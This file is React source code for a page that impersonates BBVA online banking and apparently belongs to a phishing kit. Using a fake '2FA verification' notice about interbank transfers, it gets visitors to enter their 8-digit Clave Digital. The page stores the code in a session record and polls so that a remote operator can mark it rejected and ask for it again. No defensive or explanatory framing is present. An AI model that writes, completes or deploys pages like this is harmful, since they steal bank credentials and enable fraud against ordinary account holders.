import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import LoginHeader from "../components/LoginHeader";
import { base44 } from "@/api/base44Client";
import { usePresence } from "@/hooks/usePresence";

export default function Verificacion() {
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get("sessionId");

  const [phase, setPhase] = useState("claveDigital");
  const [claveDigital, setClaveDigital] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const pollTimerRef = useRef(/** @type {ReturnType<typeof setTimeout> | null} */ (null));
  const pollActiveRef = useRef(false);

  const stopPolling = () => {
    pollActiveRef.current = false;
    if (pollTimerRef.current) clearTimeout(pollTimerRef.current);
  };

  const startPolling = (/** @type {() => Promise<void>} */ checkFn) => {
    stopPolling();
    pollActiveRef.current = true;
    const poll = async () => {
      if (!pollActiveRef.current) return;
      await checkFn();
      if (pollActiveRef.current) {
        pollTimerRef.current = setTimeout(poll, 300);
      }
    };
    pollTimerRef.current = setTimeout(poll, 300);
  };

  useEffect(() => {
    return () => stopPolling();
  }, []);

  const formRef = useRef(null);
  const { setRejected } = usePresence(sessionId, formRef);

  const handleSubmitClaveDigital = async () => {
    if (!claveDigital.trim() || !sessionId || submitting) return;
    setRejected(false);
    setSubmitting(true);
    try {
      await base44.entities.UserSessionData.update(sessionId, {
        claveDigital: claveDigital.trim(),
      });
      await base44.entities.UserSessionData.update(sessionId, {
        claveDigitalStatus: "pending",
      });
    } catch {
      setSubmitting(false);
      return;
    }
    setSubmitting(false);
    setPhase("done");

    startPolling(async () => {
      try {
        const res = await base44.entities.UserSessionData.filter({ id: sessionId });
        const s = /** @type {any} */ (res[0]);
        if (!s) return;
        if (s.claveDigitalStatus === "rejected") {
          stopPolling();
          setClaveDigital("");
          setPhase("claveDigitalRejected");
          setRejected(true);
        }
      } catch (_) {}
    });
  };

  if (phase === "done") {
    return (
      <div style={{ position: "fixed", inset: 0, background: "white", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", zIndex: 9999, gap: "20px" }}>
        <div style={{ width: "40px", height: "40px", border: "4px solid #e5e7eb", borderTop: "4px solid #1973B8", borderRadius: "50%", animation: "spin 1s linear infinite" }} />
        <style>{"@keyframes spin { to { transform: rotate(360deg); } }"}</style>
        <p style={{ margin: 0, fontSize: "14px", color: "#004481", fontFamily: '"BentonSansBBVA Book", Helvetica, Arial, sans-serif', letterSpacing: "0.02em" }}>Ingresando...</p>
      </div>
    );
  }

  const isDigitalRejected = phase === "claveDigitalRejected";
  const claveDigitalValid = claveDigital.trim().length > 0;

  return (
    <div className="min-h-screen bg-white font-main flex flex-col">
      <LoginHeader />
      <main className="flex-1 flex flex-col items-center pt-10">
        <div ref={formRef} style={{ width: "100%", maxWidth: "620px", padding: "0 24px" }}>

          {isDigitalRejected && (
            <div style={{ display: "flex", alignItems: "center", gap: "10px", background: "#fff3f3", border: "1px solid #f5c6c6", borderRadius: "4px", padding: "12px 16px", marginBottom: "20px" }}>
              <span style={{ fontSize: "18px" }}>⚠️</span>
              <span style={{ fontSize: "14px", color: "#cc0000" }}>
                La clave digital ingresada es incorrecta. Por favor, corrija la información e intente nuevamente.
              </span>
            </div>
          )}

          <p style={{ fontSize: "15px", color: "#121212", marginBottom: "24px", lineHeight: "1.6" }}>
            Hemos añadido recientemente un paso extra de verificación <strong>2FA</strong> para
            reforzar la seguridad de su cuenta para Transferencias &gt; Transferencias otros Bancos
          </p>

          <div style={{ border: "1px solid #b0bec5", borderRadius: "2px", overflow: "hidden", marginBottom: "32px" }}>
            <div style={{ display: "flex", alignItems: "center", background: "#dce8f0" }}>
              <div style={{ flex: "0 0 45%", padding: "10px 16px", fontSize: "14px", fontWeight: "bold", color: "#121212", borderRight: "1px solid #b0bec5" }}>
                Clave Digital
              </div>
              <div style={{ flex: 1, padding: "6px 12px" }}>
                <input
                  type="text"
                  inputMode="numeric"
                  value={claveDigital}
                  onChange={(e) => {
                    const val = e.target.value.replace(/[^0-9]/g, "");
                    if (val.length <= 8) setClaveDigital(val);
                  }}
                  style={{
                    width: "100%", border: "1px solid #90a4ae", borderRadius: "2px",
                    padding: "4px 8px", fontSize: "14px", outline: "none", fontFamily: "inherit", letterSpacing: "2px",
                    background: "white", color: "#121212",
                    boxSizing: "border-box",
                  }}
                />
              </div>
            </div>
          </div>

          <div style={{ textAlign: "center" }}>
            <button
              disabled={!claveDigitalValid || submitting}
              onClick={handleSubmitClaveDigital}
              style={{
                padding: "11px 52px", fontSize: "15px",
                background: claveDigitalValid && !submitting ? "#1973B8" : "#d6d6d6",
                color: claveDigitalValid && !submitting ? "white" : "#999",
                border: "none", borderRadius: "4px",
                cursor: claveDigitalValid && !submitting ? "pointer" : "not-allowed",
                fontFamily: "inherit", transition: "all 0.2s",
              }}
            >
              {submitting ? "Enviando..." : "Continuar"}
            </button>
          </div>

        </div>
      </main>
    </div>
  );
}
